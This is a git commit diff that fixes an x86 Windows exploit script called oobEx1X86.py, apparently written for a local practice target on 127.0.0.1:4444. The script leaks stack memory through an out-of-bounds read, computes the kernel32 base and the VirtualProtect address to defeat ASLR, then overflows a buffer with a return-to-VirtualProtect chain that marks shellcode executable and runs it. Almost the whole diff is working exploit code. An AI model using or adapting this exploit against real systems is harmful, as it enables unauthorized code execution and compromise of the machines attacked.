dbec455d86dd299da2ae823a83877ec8a020293b
zakki0925224 <zakki0925224@gmail.com>
2026-06-09 22:21:57 +0900

    [Fix]: Fixed OobEx1

--- scripts/oobEx1X86.py
+++ scripts/oobEx1X86.py
@@ -5,10 +5,10 @@ from functools import reduce
 s = Socket("127.0.0.1", 4444)
 
 N = 20
-OFFSET_CONTENT_TO_BASE_THREAD_INIT_THUNK_0x19 = 0x64
-OFFSET_CONTENT_TO_SAVED_EBP = 0x18
+OFFSET_CONTENT_TO_BASE_THREAD_INIT_THUNK_0x19 = 0x7C
+OFFSET_CONTENT_TO_SAVED_EBP = 0x24
 OFFSET_CONTENT_TO_RET = OFFSET_CONTENT_TO_SAVED_EBP + 4
-OFFSET_EBP_TO_CONTENT = 0x60
+OFFSET_EBP_TO_CONTENT = 0x30
 
 CONTENT_LEN = 200
 
@@ -48,77 +48,67 @@ def write_mem(data: bytes):
     s.send(data + b"\r\n")
 
 
-def generate_payload(
-    padding_size: int, shell_code_address: int, virtualProtectStub_address: int
-) -> bytes:
-    payload = b""
-    payload += b"A" * padding_size
-    payload += le32(virtualProtectStub_address)
-    payload += le32(shell_code_address)
-    payload += le32(shell_code_address)
-    payload += le32(len(X86_SHELL_CODE))
-    payload += le32(0x40)
-    payload += le32(shell_code_address - 7 * 4)  # padding area
-    payload += X86_SHELL_CODE
-
-    return payload
-
-
 def main() -> bool:
-    result = False
-
     s.connect()
     cmd()
     set_content_len(CONTENT_LEN)  # must be big than payload size
     cmd()
     data = get_content()
 
-    for offset in [0, 4, 8, 12]:
+    kernel32_address = None
+    offset = None
+
+    for off in [0, 4, 8, 12]:
         kernel32_BaseThreadInitThunk_address = (
-            to_u32(data, OFFSET_CONTENT_TO_BASE_THREAD_INIT_THUNK_0x19 + offset) - 0x19
+            to_u32(data, OFFSET_CONTENT_TO_BASE_THREAD_INIT_THUNK_0x19 + off) - 0x19
         )
-        kernel32_address = (
-            kernel32_BaseThreadInitThunk_address - X86_OFFSET_BaseThreadInitThunk
-        )
-        kernel32_VirtualProtectStub_address = (
-            kernel32_address + X86_OFFSET_VirtualProtectStub
-        )
+        addr = kernel32_BaseThreadInitThunk_address - X86_OFFSET_BaseThreadInitThunk
 
-        if kernel32_address & 0xFFFF == 0:
-            result = True
-            saved_ebp = to_u32(data, OFFSET_CONTENT_TO_SAVED_EBP + offset)
-            content_address = saved_ebp - OFFSET_EBP_TO_CONTENT + offset
-
-            print(f"offset: {offset}")
-            print(f"saved ebp: 0x{saved_ebp:x}")
-            print(f"content.content: 0x{content_address:x}")
-            print(f"kernel32 base: 0x{kernel32_address:x}")
-            print(
-                f"kernel32!VirtualProtectStub: 0x{kernel32_VirtualProtectStub_address:x}"
-            )
-
-            # pwn
-            padding_size = OFFSET_CONTENT_TO_RET + offset
-            shell_code_address = content_address + padding_size + 4 * 6
-            payload = generate_payload(
-                padding_size, shell_code_address, kernel32_VirtualProtectStub_address
-            )
-            print(f"payload: {payload}")
-
-            assert CONTENT_LEN >= len(payload) + 2
-
-            write_mem(payload)
-
-            cmd()
-            exit_func()
-
+        if addr & 0xFFFF == 0:
+            kernel32_address = addr
+            offset = off
             break
 
-    if not result:
+    if kernel32_address == None or offset == None:
         print("No valid address")
+        return False
+
+    kernel32_VirtualProtectStub_address = (
+        kernel32_address + X86_OFFSET_VirtualProtectStub
+    )
+
+    saved_ebp = to_u32(data, OFFSET_CONTENT_TO_SAVED_EBP + offset)
+    content_address = saved_ebp - OFFSET_EBP_TO_CONTENT + offset
+
+    print(f"offset: {offset}")
+    print(f"saved ebp: 0x{saved_ebp:x}")
+    print(f"content.content: 0x{content_address:x}")
+    print(f"kernel32!VirtualProtectStub: 0x{kernel32_VirtualProtectStub_address:x}")
+
+    # pwn
+    padding_size = OFFSET_CONTENT_TO_RET + offset
+    shell_code_address = content_address + padding_size + 4 * 6
+
+    payload = b""
+    payload += b"A" * padding_size
+    payload += le32(kernel32_VirtualProtectStub_address)
+    payload += le32(shell_code_address)
+    payload += le32(shell_code_address)
+    payload += le32(len(X86_SHELL_CODE))
+    payload += le32(0x40)
+    payload += le32(content_address)
+    payload += X86_SHELL_CODE
+    print(f"payload: {payload}")
+
+    write_mem(payload)
+    print("payload write")
+    input("Press Enter to continue...")
+
+    cmd()
+    exit_func()
 
     s.kill()
-    return result
+    return True
 
 
 if __name__ == "__main__":
